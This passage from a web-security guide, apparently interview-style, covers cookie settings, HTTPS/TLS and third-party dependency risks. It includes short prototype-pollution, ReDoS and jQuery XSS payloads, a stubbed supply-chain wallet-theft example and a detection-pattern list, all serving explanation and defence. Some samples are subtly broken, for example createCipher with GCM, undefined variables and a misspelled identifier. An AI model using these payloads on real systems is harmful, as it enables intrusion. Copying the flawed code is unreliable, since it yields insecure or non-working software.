res.cookie('auth', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 1800000,
});

// Preference cookie (less sensitive)
res.cookie('preferences', userPrefs, {
  httpOnly: false, // May need JavaScript access
  secure: true,
  sameSite: 'lax',
  maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
});

// Analytics cookie (cross-site functionality needed)
res.cookie('analytics', analyticsId, {
  httpOnly: true,
  secure: true,
  sameSite: 'none', // Allows cross-site requests
  maxAge: 365 * 24 * 60 * 60 * 1000, // 1 year
});
```

**Browser Compatibility Considerations:**

```javascript
// Handle older browsers that don't support SameSite
function setSameSiteCookie(res, name, value, options = {}) {
  const userAgent = req.headers['user-agent'];

  // Check if browser supports SameSite
  if (supportsSameSite(userAgent)) {
    res.cookie(name, value, {
      ...options,
      sameSite: 'strict',
    });
  } else {
    // Fallback for older browsers
    res.cookie(name, value, {
      ...options,
      // Omit sameSite for compatibility
    });
  }
}
```

---

## HTTPS and SSL/TLS

### 19. Why is HTTPS important for securing communication between clients and servers?

HTTPS (HTTP Secure) is crucial for web security as it encrypts communication
between clients and servers, preventing eavesdropping, tampering, and
impersonation attacks.

**Security Benefits of HTTPS:**

**Data Encryption:**

- All data transmitted between client and server is encrypted
- Prevents eavesdropping on sensitive information (passwords, personal data,
  financial information)
- Uses symmetric encryption for data transfer efficiency
- Protects against packet sniffing and network monitoring

**Data Integrity:**

- Ensures data hasn't been modified during transmission
- Uses cryptographic hashes to detect tampering
- Prevents man-in-the-middle attacks that alter content
- Guarantees that received data matches what was sent

**Server Authentication:**

- Verifies the identity of the server using digital certificates
- Prevents impersonation attacks and fake websites
- Ensures users are connecting to the legitimate server
- Uses Certificate Authorities (CAs) for trust verification

**Client Authentication (Optional):**

- Can verify client identity using client certificates
- Useful for high-security applications
- Provides mutual authentication between client and server

**Attack Prevention Examples:**

**Without HTTPS (Vulnerable):**

```http
GET /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123
```

- Password transmitted in plaintext
- Vulnerable to packet sniffing
- Can be intercepted on public WiFi networks

**With HTTPS (Secure):**

```http
# Encrypted TLS tunnel established first
# All HTTP data encrypted within the tunnel
GET /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

[ENCRYPTED DATA - unreadable to attackers]
```

**Common Attack Scenarios Prevented:**

**WiFi Eavesdropping:**

```javascript
// Without HTTPS: Attacker can capture login credentials
// Network packet capture shows:
// POST /login
// username=victim&password=password123

// With HTTPS: All data encrypted
// Network packet capture shows only encrypted data
```

**Man-in-the-Middle Attacks:**

```javascript
// Without HTTPS: Attacker can modify responses
// Attacker injects: <script>steal_cookies()</script>

// With HTTPS: Certificate validation prevents MITM
// Any tampering breaks the TLS connection
```

**Performance and SEO Benefits:**

- HTTP/2 requires HTTPS for better performance
- Search engines favor HTTPS sites in rankings
- Browsers mark HTTP sites as "not secure"
- Users trust HTTPS sites more for sensitive transactions

**Implementation Requirements:**

```javascript
// Force HTTPS redirection
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});

// Strict Transport Security header
app.use((req, res, next) => {
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains'
  );
  next();
});
```

### 20. Explain the role of SSL/TLS in establishing a secure connection.

SSL (Secure Sockets Layer) and its successor TLS (Transport Layer Security) are
cryptographic protocols that provide secure communication over networks.

**TLS Handshake Process:**

**Step 1: Client Hello**

```
Client → Server: TLS version, cipher suites, random number
```

- Client announces supported TLS versions
- Lists supported cipher suites (encryption algorithms)
- Sends client random number for key generation

**Step 2: Server Hello**

```
Server → Client: TLS version, chosen cipher suite, random number, certificate
```

- Server selects TLS version and cipher suite
- Sends server certificate containing public key
- Provides server random number

**Step 3: Certificate Verification**

```javascript
// Client verifies server certificate
function verifyCertificate(certificate) {
  // Check certificate chain back to trusted CA
  // Verify certificate hasn't expired
  // Confirm certificate matches domain name
  // Check certificate hasn't been revoked
  return isValid;
}
```

**Step 4: Key Exchange**

```
Client → Server: Encrypted pre-master secret (using server's public key)
```

- Client generates pre-master secret
- Encrypts with server's public key from certificate
- Both sides derive master secret from pre-master secret and random numbers

**Step 5: Cipher Spec Change**

```
Both sides: Switch to encrypted communication using derived keys
```

**Step 6: Finished Messages**

```
Both sides: Send encrypted "finished" messages to confirm handshake
```

**Cryptographic Components:**

**Symmetric Encryption:**

```javascript
// AES encryption for data transfer (fast)
const cipher = crypto.createCipher('aes-256-gcm', symmetricKey);
let encrypted = cipher.update(data, 'utf8', 'hex');
encrypted += cipher.final('hex');
```

**Asymmetric Encryption:**

```javascript
// RSA for key exchange (slower but secure)
const publicKey = certificate.publicKey;
const encryptedSecret = crypto.publicEncrypt(publicKey, preMarshallSecret);
```

**Hash Functions:**

```javascript
// SHA-256 for integrity verification
const hash = crypto.createHash('sha256');
hash.update(data);
const digest = hash.digest('hex');
```

**Digital Signatures:**

```javascript
// Server proves identity with private key signature
const signature = crypto.sign('sha256', data, privateKey);
const isValid = crypto.verify('sha256', data, publicKey, signature);
```

**Certificate Chain Validation:**

**Root Certificate Authority:**

```
Root CA (trusted by browsers)
  └── Intermediate CA
      └── Server Certificate (example.com)
```

**Certificate Validation Process:**

```javascript
function validateCertificateChain(serverCert, intermediates, rootCAs) {
  // 1. Verify server cert was signed by intermediate CA
  if (!verifySignature(serverCert, intermediate.publicKey)) {
    return false;
  }

  // 2. Verify intermediate was signed by root CA
  if (!verifySignature(intermediate, rootCA.publicKey)) {
    return false;
  }

  // 3. Verify root CA is trusted
  if (!rootCAs.includes(rootCA)) {
    return false;
  }

  // 4. Check certificate validity dates
  const now = new Date();
  if (now < serverCert.notBefore || now > serverCert.notAfter) {
    return false;
  }

  // 5. Verify domain name matches
  if (!matchesDomain(serverCert.subject, requestedDomain)) {
    return false;
  }

  return true;
}
```

**Perfect Forward Secrecy:**

```javascript
// Ephemeral key exchange (DHE/ECDHE)
// Each session uses unique keys
// Compromise of long-term keys doesn't affect past sessions
const ephemeralKeyPair = crypto.generateKeyPairSync('ec', {
  namedCurve: 'secp256r1',
});
```

**TLS Configuration Best Practices:**

**Server Configuration:**

```javascript
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('private-key.pem'),
  cert: fs.readFileSync('certificate.pem'),
  ca: fs.readFileSync('ca-certificate.pem'),

  // Security configurations
  secureProtocol: 'TLSv1_2_method', // Minimum TLS 1.2
  ciphers: [
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-RSA-AES256-SHA384',
  ].join(':'),
  honorCipherOrder: true,
};

https.createServer(options, app).listen(443);
```

**Modern TLS Features:**

- **TLS 1.3**: Faster handshake, stronger security
- **0-RTT**: Resume connections without full handshake
- **Certificate Transparency**: Public logs of certificates
- **OCSP Stapling**: Real-time certificate revocation checking

---

## Dependency Security

### 21. How can the use of third-party dependencies introduce security vulnerabilities?

Third-party dependencies are external libraries, frameworks, and packages that
applications rely on. While they provide functionality and speed development,
they also introduce potential security risks.

**Common Vulnerability Sources:**

**Known Security Vulnerabilities:**

```json
// package.json with vulnerable dependencies
{
  "dependencies": {
    "lodash": "4.17.4", // Known XSS vulnerability
    "express": "4.16.0", // Known DoS vulnerability
    "moment": "2.19.3", // Known ReDoS vulnerability
    "jquery": "2.1.4" // Multiple XSS vulnerabilities
  }
}
```

**Transitive Dependencies:**

```bash
# Your direct dependency tree
myapp
├── express@4.18.0
│   ├── body-parser@1.20.0
│   │   └── qs@6.10.3        # Vulnerable transitive dependency
│   └── cookie@0.5.0
└── lodash@4.17.21
```

**Supply Chain Attacks:**

```javascript
// Malicious code in compromised packages
// Example: event-stream incident
const eventStream = require('event-stream');

// Compromised version contained:
function stealBitcoinWallets() {
  // Malicious code to steal cryptocurrency
  if (process.env.npm_package_description.indexOf('wallet') !== -1) {
    // Send wallet data to attacker
  }
}
```

**Vulnerability Examples:**

**Prototype Pollution (lodash):**

```javascript
const _ = require('lodash');

// Vulnerable version allows prototype pollution
_.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted); // 'yes' - prototype was polluted

// Can lead to RCE in some cases
_.set({}, '__proto__.constructor.prototype.polluted', 'rce');
```

**Regular Expression DoS (moment.js):**

```javascript
const moment = require('moment');

// Vulnerable regex can cause catastrophic backtracking
const maliciousInput = 'a'.repeat(50000) + 'X';
moment(maliciousInput, 'YYYY-MM-DD'); // Causes CPU spike
```

**Cross-Site Scripting (jQuery):**

```javascript
// Older jQuery versions vulnerable to XSS
$('#content').html(userInput); // Direct HTML injection

// Vulnerable selector parsing
$(userInput); // Can execute JavaScript if userInput contains script tags
```

**Risk Assessment Framework:**

**Dependency Audit Process:**

```javascript
// Automated vulnerability scanning
const auditReport = {
  advisories: {
    118: {
      findings: [
        {
          version: '4.17.4',
          paths: ['lodash'],
        },
      ],
      id: 118,
      title: 'Prototype Pollution',
      severity: 'low',
      vulnerable_versions: '<4.17.12',
    },
  },
};

// Risk scoring
function calculateRisk(advisory) {
  const severityWeight = {
    critical: 10,
    high: 7,
    moderate: 4,
    low: 1,
  };

  const exposureFactors = {
    directDependency: 2,
    publicFacing: 3,
    privilegedAccess: 2,
  };

  return (
    severityWeight[advisory.severity] *
    Object.values(exposureFactors).reduce((a, b) => a + b, 1)
  );
}
```

**Malicious Package Detection:**

```javascript
// Suspicious package indicators
const suspiciousPatterns = {
  // Typosquatting
  packageName: /^(reac|expres|lodas)/, // Similar to popular packages

  // Unusual permissions
  networkAccess: /require\(['"]https?:\/\//, // Remote code loading
  fileSystemAccess: /fs\.(readFile|writeFile|unlink)/,
  processAccess: /process\.(env|exit|kill)/,

  // Obfuscation
  encodedStrings: /eval\(|Function\(|\\x[0-9a-f]{2}/,
  base64: /[A-Za-z0-9+\/]{20,}={0,2}/,
};
```

**Impact Assessment:**

- **Data Breach**: Vulnerable dependencies can expose sensitive data
- **Remote Code Execution**: Critical vulnerabilities may allow attackers to
  execute arbitrary code
- **Denial of Service**: Performance vulnerabilities can crash applications
- **Supply Chain Compromise**: Malicious packages can backdoor applications
- **Compliance Violations**: Vulnerable dependencies may violate security
  standards

### 22. Discuss best practices for securing and monitoring dependencies in a web application.

**Dependency Management Best Practices:**

**Vulnerability Scanning and Monitoring:**

```bash
# NPM audit for Node.js projects
npm audit
npm audit --audit-level moderate
npm audit fix

# Yarn audit
yarn audit
yarn audit --level moderate

# Automated scanning in CI/CD
npm audit --json | audit-ci --moderate
```

**Automated Dependency Updates:**

```yaml
# Dependabot configuration (.github/dependabot.yml)
version: 2
updates:
  - package-ecosystem: 'npm'
    directory: '/'
    schedule:
      interval: 'weekly'
    reviewers:
      - 'security-team'
    assignees:
      - 'lead-developer'
    commit-message:
      prefix: 'security'
      include: 'scope'
```

**Lock File Management:**

```json
// package-lock.json ensures reproducible builds
{
  "name": "myapp",
  "lockfileVersion": 2,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="
    }
  }
}
```

**Security-First Dependency Selection:**

**Evaluation Criteria:**

```javascript
const dependencyEvaluation = {
  security: {
    vulnerabilityHistory: 'Check CVE database',
    maintainerReputation: 'Verify maintainer credibility',
    updateFrequency: 'Regular security updates',
    auditResults: 'Clean security audit',
  },

  maintenance: {
    lastUpdate: 'Recent activity',
    issueResponse: 'Active issue resolution',
    communitySupport: 'Active community',
    documentation: 'Comprehensive docs',
  },

  technical: {
    codeQuality: 'High code standards',
    testCoverage: 'Comprehensive tests',
    performance: 'Minimal performance impact',
    sizeOptimization: 'Small bundle size',
  },
};
```

**Dependency Pinning Strategy:**

```json
// Strict version pinning for security-critical dependencies
{
  "dependencies": {
    "express": "4.18.2", // Exact version
    "helmet": "~6.0.1", // Patch updates only
    "lodash": "^4.17.21" // Minor updates allowed
  },
  "devDependencies": {
    "jest": "*", // Latest for development tools
    "eslint": "^8.0.0"
  }
}
```

**Security Monitoring Implementation:**

**Continuous Monitoring Pipeline:**

```javascript
// Security monitoring script
const { execSync } = require('child_process');
const axios = require('axios');

async function securityCheck() {
  try {
    // Run audit
    const auditResult = execSync('npm audit --json', { encoding: 'utf8' });
    const audit = JSON.parse(auditResult);

    // Check for high/critical vulnerabilities
    const criticalVulns = audit.vulnerabilities.filter(
      (v) => v.severity === 'high' || v.severity === 'critical'
    );

    if (criticalVulns.length > 0) {
      await alertSecurityTeam(criticalVulns);
      process.exit(1);
    }

    // Check for outdated packages
    const outdatedResult = execSync('npm outdated --json', {
      encoding: 'utf8',
    });
    const outdated = JSON.parse(outdatedResult);

    // Generate security report
    generateSecurityReport({
      vulnerabilities: audit.vulnerabilities,
      outdatedPackages: outdated,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Security check failed:', error);
    process.exit(1);
  }
}
```

**SBOM (Software Bill of Materials) Generation:**

```javascript
// Generate SBOM for compliance and tracking
function generateSBOM() {
  const packageJson = require('./package.json');
  const packageLock = require('./package-lock.json');

  const sbom = {
    bomFormat: 'CycloneDX',
    specVersion: '1.4',
    version: 1,
    metadata: {
      timestamp: new Date().toISOString(),
      tools: ['npm'],
      component: {
        type: 'application',
        name: packageJson.name,
        version: packageJson.version,
      },
    },
    components: [],
  };

  // Add all dependencies to SBOM
  Object.entries(packageLock.packages).forEach(([path, pkg]) => {
    if (path !== '' && pkg.version) {
      sbom.components.push({
        type: 'library',
        name: path.replace('node_modules/', ''),
        version: pkg.version,
        hashes: pkg.integrity ? [pkg.integrity] : [],
        licenses: pkg.license ? [pkg.license] : [],
      });
    }
  });

  return sbom;
}
```

**Runtime Security Monitoring:**

```javascript
// Runtime Application Self-Protection (RASP)
const securityMiddleware = (req, res, next) => {
  // Monitor for suspicious dependency behavior
  const originalRequire = require;
  require = function (moduleName) {
    // Log and analyze module loading
    console.log(`Loading module: ${moduleName}`);

    // Check against whitelist
    if (!isWhitelistedModule(moduleName)) {
      throw new Error(`Unauthorized module access: ${moduleName}`);
    }

    return originalRequire.apply(this, arguments);
  };

  next();
};
```

**Incident Response Plan:**

```javascript
// Automated response to critical vulnerabilities
async function handleCriticalVulnerability(vulnerability) {
  const response = {
    immediate: [
      'Alert security team',
      'Block affected functionality',
      'Document impact assessment',
    ],

    shortTerm: [
      'Apply security patches',
      'Update dependencies',
      'Run comprehensive tests',
      'Deploy emergency fix',
    ],

    longTerm: [
      'Review dependency policies',
      'Improve monitoring',
      'Update security procedures',
      'Conduct post-incident review',
    ],
  };

  // Execute immediate response
  await Promise.all([
    alertSecurityTeam(vulnerability),
    blockAffectedEndpoints(vulnerability),
    logSecurityIncident(vulnerability),
  ]);

  return response;
}
```

**Policy Enforcement:**

```javascript
// Pre-commit hooks for dependency security
// .husky/pre-commit
#!/bin/sh
. "$(dirname "$0")/_/husky.sh"

echo "Running security checks..."

# Check for vulnerabilities
npm audit --audit-level moderate
if [ $? -ne 0 ]; then
    echo "❌ Security vulnerabilities found. Commit blocked."
    exit 1
fi

# Check for unauthorized dependencies
node scripts/check-dependencies.js
if [ $? -ne 0 ]; then
    echo "❌ Unauthorized dependencies found. Commit blocked."
    exit 1
fi

echo "✅ Security checks passed."
```

---

🎯 These security measures work together to create a comprehensive defense
against common web vulnerabilities. Always implement multiple layers of security
rather than relying on a single protection mechanism! 🛡️✨

**[⬆ Back to Top](#table-of-contents)**
